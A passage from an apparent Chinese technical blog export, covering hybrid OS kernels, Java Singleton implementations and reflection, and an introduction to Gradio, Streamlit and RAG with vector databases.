混合内核</h2><p>混合内核是两全其美的选择。</p><p>混合内核，基于微内核的架构设计，把一些性能要求高的服务放在内核中，比如设备驱动、应用进程间通信等，而其他的服务则放在用户空间中。这种设计既有宏内核的性能优势，又有微内核的稳定性优势。但是，这种设计的缺点是复杂性高，需要仔细地选择哪些服务放在内核中，哪些服务放在用户空间中。</p><p>就像一个城市的交通系统中，主干道和桥梁是由中央指挥系统控制，同时核心的公交、地铁服务也放到了中央指挥系统中，但是其他的如出租车、网约车、私家车等则是由各自的调度系统进行管理。这种方式既有宏内核的性能优势，又有微内核的稳定性优势，就像主干道的畅通和公共交通工具的可用可以保证基本的交通需要，而其它的调度系统则可以灵活地调配资源，提高交通运输的效率。</p><p>混合内核的代表有Windows NT，XNU等。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>设计模式：单例</title>
      <link href="/2024/07/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9A%E5%8D%95%E4%BE%8B/"/>
      <url>/2024/07/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9A%E5%8D%95%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Intent"><a href="#1-Intent" class="headerlink" title="1 Intent"></a>1 Intent</h1><p>确保一个类只有一个实例，并提供该实例的全局访问点。</p><hr><h1 id="2-Class-Diagram"><a href="#2-Class-Diagram" class="headerlink" title="2 Class Diagram"></a>2 Class Diagram</h1><p>使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。</p><p>私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。</p><p><img src="/2024/07/18/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9A%E5%8D%95%E4%BE%8B/image_dTTQpXPwE_.png"></p><hr><h1 id="3-Implementation"><a href="#3-Implementation" class="headerlink" title="3 Implementation"></a>3 Implementation</h1><h2 id="3-1-懒汉式-线程不安全"><a href="#3-1-懒汉式-线程不安全" class="headerlink" title="3.1 懒汉式-线程不安全"></a>3.1 懒汉式-线程不安全</h2><p>以下实现中，私有静态变量 <code>uniqueInstance</code>被延迟实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 <code>uniqueInstance</code>，从而节约资源。</p><p>这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 <code>if (uniqueInstance == null)</code> ，并且此时 <code>uniqueInstance</code>为 null，那么会有多个线程执行 <code>uniqueInstance = new Singleton();</code> 语句，这将导致实例化多次 <code>uniqueInstance</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton uniqueInstance;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">            uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uniqueInstance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-饿汉式-线程安全"><a href="#3-2-饿汉式-线程安全" class="headerlink" title="3.2 饿汉式-线程安全"></a>3.2 饿汉式-线程安全</h2><p>线程不安全问题主要是由于 <code>uniqueInstance</code>被实例化多次，采取直接实例化 <code>uniqueInstance</code>的方式就不会产生线程不安全问题。</p><p>但是直接实例化的方式也丢失了延迟实例化带来的节约资源的好处。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">uniqueInstance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br></pre></td></tr></table></figure><h2 id="3-3-懒汉式-线程安全"><a href="#3-3-懒汉式-线程安全" class="headerlink" title="3.3 懒汉式-线程安全"></a>3.3 懒汉式-线程安全</h2><p>只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了实例化多次 uniqueInstance。</p><p>但是当一个线程进入该方法之后，其它试图进入该方法的线程都必须等待，即使 uniqueInstance 已经被实例化了。这会让线程阻塞时间过长，因此该方法有性能问题，不推荐使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">        uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> uniqueInstance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-4-双重校验锁-线程安全"><a href="#3-4-双重校验锁-线程安全" class="headerlink" title="3.4 双重校验锁-线程安全"></a>3.4 双重校验锁-线程安全</h2><p>uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。</p><p>双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">static</span> Singleton uniqueInstance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> uniqueInstance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考虑下面的实现，也就是只使用了一个 if 语句。在 <code>uniqueInstance == null</code> 的情况下，如果两个线程都执行了 if 语句，那么两个线程都会进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 <code>uniqueInstance = new Singleton();</code> 这条语句，只是先后的问题，那么就会进行两次实例化。因此必须使用双重校验锁，也就是需要使用两个 if 语句：第一个 if 语句用来避免 <code>uniqueInstance</code>已经被实例化之后的加锁操作，而第二个 if 语句进行了加锁，所以只能有一个线程进入，就不会出现 <code>uniqueInstance== null</code>时两个线程同时进行实例化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uniqueInstance == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">        uniqueInstance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>uniqueInstance 采用 volatile 关键字修饰也是很有必要的， <code>uniqueInstance = new Singleton();</code> 这段代码其实是分为三步执行：</p><ol><li>为 uniqueInstance 分配内存空间</li><li>初始化 uniqueInstance</li><li>将 uniqueInstance 指向分配的内存地址</li></ol><p>但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1&gt;3&gt;2。指令重排在单线程环境下不会出现问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T&lt;sub&gt;1&lt;&#x2F;sub&gt; 执行了 1 和 3，此时 T&lt;sub&gt;2&lt;&#x2F;sub&gt; 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。</p><p>使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。</p><h2 id="3-5-静态内部类实现"><a href="#3-5-静态内部类实现" class="headerlink" title="3.5 静态内部类实现"></a>3.5 静态内部类实现</h2><p>当 Singleton 类被加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 <code>getUniqueInstance()</code> 方法从而触发 <code>SingletonHolder.INSTANCE</code> 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。</p><p>这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SingletonHolder</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Singleton</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getUniqueInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-6-枚举实现"><a href="#3-6-枚举实现" class="headerlink" title="3.6 枚举实现"></a>3.6 枚举实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    INSTANCE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String objName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getObjName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> objName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObjName</span><span class="params">(String objName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.objName = objName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 单例测试</span></span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">firstSingleton</span> <span class="operator">=</span> Singleton.INSTANCE;</span><br><span class="line">        firstSingleton.setObjName(<span class="string">&quot;firstName&quot;</span>);</span><br><span class="line">        System.out.println(firstSingleton.getObjName());</span><br><span class="line">        </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">secondSingleton</span> <span class="operator">=</span> Singleton.INSTANCE;</span><br><span class="line">        secondSingleton.setObjName(<span class="string">&quot;secondName&quot;</span>);</span><br><span class="line">        System.out.println(firstSingleton.getObjName());</span><br><span class="line">        System.out.println(secondSingleton.getObjName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射获取实例测试</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Singleton[] enumConstants = Singleton.class.getEnumConstants();</span><br><span class="line">            <span class="keyword">for</span> (Singleton enumConstant : enumConstants) &#123;</span><br><span class="line">                System.out.println(enumConstant.getObjName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">firstName</span><br><span class="line">secondName</span><br><span class="line">secondName</span><br><span class="line">secondName</span><br></pre></td></tr></table></figure><p>该实现可以防止反射攻击。在其它实现中，通过<code>setAccessible()</code>方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象，如果要防止这种攻击，需要在构造函数中添加防止多次实例化的代码。该实现是由 <code>JVM</code>保证只会实例化一次，因此不会出现上述的反射攻击。</p><p>该实现在多次序列化和序列化之后，不会得到多个实例。而其它实现需要使用 transient 修饰所有字段，并且实现序列化和反序列化的方法。</p><hr><h1 id="4-反射"><a href="#4-反射" class="headerlink" title="4 反射"></a>4 反射</h1><h2 id="4-1-什么是反射"><a href="#4-1-什么是反射" class="headerlink" title="4.1 什么是反射"></a>4.1 什么是反射</h2><p>反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。</p><p>一般情况下，我们使用某个类时必定知道它是什么类，是用来做什么的。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Apple</span> <span class="variable">apple</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Apple</span>(); <span class="comment">//直接初始化，「正射」</span></span><br><span class="line">apple.setPrice(<span class="number">4</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这样子进行类对象的初始化，我们可以理解为「正」。</p><p>而反射则是一开始并不知道我要初始化的类对象是什么，自然也无法使用 new 关键字来创建对象了。</p><p>这时候，我们使用 JDK 提供的反射 API 进行反射调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.chenshuyi.reflect.Apple&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clz.getConstructor();</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance();</span><br><span class="line">method.invoke(object, <span class="number">4</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面两段代码的执行结果，其实是完全一样的。但是其思路完全不一样，第一段代码在未运行时就已经确定了要运行的类（Apple），而第二段代码则是在运行时通过字符串值才得知要运行的类。</p><p>所以说什么是反射？</p><blockquote><p><strong>反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。</strong></p></blockquote><h2 id="4-2-反射的作用"><a href="#4-2-反射的作用" class="headerlink" title="4.2 反射的作用"></a>4.2 反射的作用</h2><p>在编译时根本无法知道该对象或类可能属于哪些类，程序只依靠运行时信息来发现该对象和类的真实信息. &#x20;<br>在运行阶段使用，不能写死；</p><p>运行过程中修改jar包中的一些内容（由于反射会额外消耗一定的系统资源，因此如果不需要动态地创建一个对象，那么就不需要用反射。 &#x20;</p><p>另外，反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。</p><p>比如在spring中，我们将所有的类Bean交给spring容器管理，无论是XML配置Bean还是注解配置，当我们从容器中获取Bean来依赖注入时，容器会读取配置，而配置中给的就是类的信息，spring根据这些信息，需要创建那些Bean，spring就动态的创建这些类。还有在<code>struts2</code>的<code>struts.xml</code>中配置action，也是通过反射调用的action。 &#x20;</p><p>还有在我们创建数据库链接时，这句代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> Class.forName(“com.java.dbtest.TestConnection”)</span><br></pre></td></tr></table></figure><p>就是告诉<code>JVM</code>去加载这个类，而加载的过程是在程序执行过程中动态加载的。通过类的全类名让jvm在服务器中找到并加载这个类，而如果是使用别的数据库，那就要换一个类了，如果是传统写死的方法创建，就要修改原来类的代码，而对于反射，则只是传入的参数就变成另一个了而已，可以通过修改配置文件，而不是直接修改代码。 &#x20;</p><p>再比如我们有两个程序员，一个程序员在写程序的时候，需要使用第二个程序员所写的类，但第二个程序员并没完成他所写的类。那么第一个程序员的代码能否通过编译呢？这是不能通过编译的。利用Java反射的机制，就可以让第一个程序员在没有得到第二个程序员所写的类的时候，来完成自身代码的编译。只是如果这个类还没有，获取时会获取不到，但不会导致编译错误，更不会导致程序的崩溃。 &#x20;</p><blockquote><p>注：以上内容不全是作者原创，一些内容来自互联网，仅供个人学习使用。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 单例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二期AI夏令营任务3：实现RAG应用</title>
      <link href="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/"/>
      <url>/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Gradio-技术入门"><a href="#1-Gradio-技术入门" class="headerlink" title="1 Gradio 技术入门"></a>1 Gradio 技术入门</h1><p><a href="https://www.gradio.app/" title="Gradio ">Gradio</a>是一个开源的 Python 库，用于快速构建机器学习和数据科学演示应用。它使得开发者可以在几行代码中创建一个简单、可调整的用户界面，用于展示机器学习模型或数据科学工作流程。<code>Gradio</code>支持多种输入输出组件，如文本、图片、视频、音频等，并且可以轻松地分享应用，包括在互联网上分享和在局域网内分享.</p><p>简单来说，利用 <code>Gradio</code> 库，我们可以很容易实现一个具有对话功能的前端页面，实现最简单人机交互功能。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_mHHa_R5sqe.gif"></p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_LiZaB_D9CZ.png"></p><p>在目前的深度学习软件开发中，使用<code>gradio</code>熟练展示demo已经成为了基础必备技能，你可以在任何地方（无论是学术还是工业界）见到 <code>gradio</code> 展示，但我们本次可以只从一个简单的对话demo开始，来逐渐展开<code>gradio</code>的熟悉之旅。</p><p>我们可以简单的理解为<code>gradio</code>就是在搭积木，或者说简单理解为所有的前端框架都是在利用一块块积木创造出最好的效果。</p><p>在<code>gradio</code>中，我们可以把每个组件创建在 <code>gr.Blocks()</code> 包裹的块当中，你可以把它当作一个展示台，我们可以在展示台上放满不同的组件（比如这里的 <code>gr.Button</code>，<code>gr.Textbox</code> 等等），你可以自由组合组件来实现想要的目标。此外，在<code>gradio</code>中同样也有各类可注册事件，这有助于我们在和组件互动时、互动后来指定我们想要发生的事情（比如执行一段函数），比如我们希望按钮按下后执行一个函数，然后根据某些组件的输入输出做反应，我们就可以像下面的 <code>.click</code> 以及 <code>.submit</code> 一样注册相应的事件，根据绑定的函数创作出更多样的可能。</p><p>最后，我们只需要<code>launch</code>我们的”展示台“，就可以看到<code>gradio</code>前端展示画面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gradio <span class="keyword">as</span> gr</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> gr.Blocks() <span class="keyword">as</span> demo:</span><br><span class="line">  gr.Markdown(<span class="string">&quot;# Qwen 聊天机器人&quot;</span>)</span><br><span class="line">  chatbot = gr.Chatbot()</span><br><span class="line">  msg = gr.Textbox()</span><br><span class="line">  clear = gr.Button(<span class="string">&quot;清除&quot;</span>)</span><br><span class="line">  stop = gr.Button(<span class="string">&quot;停止生成&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 设置用户输入提交后的处理流程</span></span><br><span class="line">  msg.submit(user，[msg，chatbot]，[msg，chatbot]，queue=<span class="literal">False</span>).then(bot，chatbot，chatbot)</span><br><span class="line">  <span class="comment"># 清除按钮功能</span></span><br><span class="line">  clear.click(<span class="keyword">lambda</span>: <span class="literal">None</span>，<span class="literal">None</span>，chatbot，queue=<span class="literal">False</span>)</span><br><span class="line">  <span class="comment"># 停止生成按钮功能</span></span><br><span class="line">  stop.click(stop_generation，queue=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;启动 Gradio 界面...&quot;</span>)</span><br><span class="line">  <span class="comment"># 启用队列处理请求</span></span><br><span class="line">  demo.queue()</span><br><span class="line">  demo.launch()</span><br></pre></td></tr></table></figure><hr><h1 id="2-Streamlit-技术入门"><a href="#2-Streamlit-技术入门" class="headerlink" title="2 Streamlit 技术入门"></a>2 Streamlit 技术入门</h1><p>简单来说，<a href="https://streamlit.io/">Streamlit</a> 是一个Python库，用于快速构建交互式Web应用程序。它提供了一个简单的API，允许开发者使用Python代码来创建Web应用程序，而无需学习复杂的Web开发技术。这听上去是不是与 <code>gradio</code>差不多？</p><p>你可以选择自己喜欢的一款前端库来完成对应 AI 应用的开发，如果聪明的你稍加精进，我们甚至可以创造出五彩缤纷的前端界面：</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_2_yefAEvJOw-.png"></p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_3_Jh_ObZMlco.png"></p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_4_vpSbC90JlJ.png"></p><p>与 <code>gradio</code> 不同的是， <code>streamlit</code> 不需要复杂的 root_path 路由修改操作，我们只需要简单的运行就可以得到结果。</p><hr><h1 id="3-RAG应用"><a href="#3-RAG应用" class="headerlink" title="3 RAG应用"></a>3 RAG应用</h1><h2 id="3-1-什么是-RAG"><a href="#3-1-什么是-RAG" class="headerlink" title="3.1 什么是 RAG"></a>3.1 什么是 RAG</h2><p>什么是 Retrieval-Augmented Generation（RAG）检索增强生成应用? 检索增强生成顾名思义，就是利用检索来增强大模型的生成结果。</p><p>具体而言，RAG 主要是在这样的场景下被需要的：想象一下，当你有一个冷门的知识需要理解，但大模型没有基于这个知识训练过，或者说你想把这个知识全部输入大模型进行问答，但是大模型的上下文没有那么长；</p><p>那么，我们需要一个好的方法让大模型可以基于我们新的知识进行对话，这就是 RAG的意义所在。</p><p>检索增强生成 (RAG) 通过向量数据库检索的方式来获取我们问题预期想要回答涉及的知识，然后结合这个知识让大模型基于知识生成最后的问答结果，满足了我们对提问的真实性需求。</p><p>在理解 RAG 之前，我们还需要理解什么是 <code>Embedding</code>。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_5_2-cRltJrzC.png"></p><p>在机器学习和自然语言处理（<code>NLP</code>）中，Embedding 是一种将非结构化数据，如单词、句子或者整个文档，转化为实数向量的技术。这些实数向量可以被计算机更好地理解和处理。我们可以把一个词(token)表示成有限维度空间中的表示。</p><p>比如，我们可以把苹果映射成 (5，5) ，把梨子映射成 (4，5)，把芯片映射到 (1，2)。在这里，坐标的相近表示梨子和苹果的语义有很大的重复成分，而芯片与苹果的距离，自然比梨子与苹果的距离要远。此时这些数字坐标映射就可以理解为简单的 Embedding。</p><p>我们可以通过 Embedding 模型，将一个词很方便映射到对应的实数多维表示空间，这个映射关系是提前训练得到的，越准确的 Embedding 模型可以让我们越好的区别不同语义特征的差异性，这也就对 RAG 的准确检索带来了更大的好处。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_6_7-U_W3JzV2.png"></p><p>在搭建 RAG 系统时，我们往往可以通过使用 Embedding 模型来构建词向量，我们可以选择使用各个公司的在线 Embedding API，也可以使用本地嵌入模型将数据构建为词向量；由于我们通常是对文档操作，这里的向量化是对文档块（chunk）进行；我们可以将一个文档分成多个段落，每个段落分别进行 Embedding 操作，得到结果后存储到对应的数据库中保存，以便后续的检索即可。</p><h2 id="3-2-向量数据库"><a href="#3-2-向量数据库" class="headerlink" title="3.2 向量数据库"></a>3.2 向量数据库</h2><p>而对于数据库，在 RAG 中，我们通常使用的也就是 Embedding 相关的数据库—向量数据库，向量数据库是一种基于向量空间模型的数据库系统，它能够利用向量运算进行数据检索的高效处理。</p><p>常见的向量数据库包括 <code>Faiss</code>、<code>Annoy</code>、<code>Milvus</code>等等。这些向量数据库通常与 <code>LLM</code> 结合使用，以提高数据检索和处理的效率。</p><p>至此，在理解了 Embedding 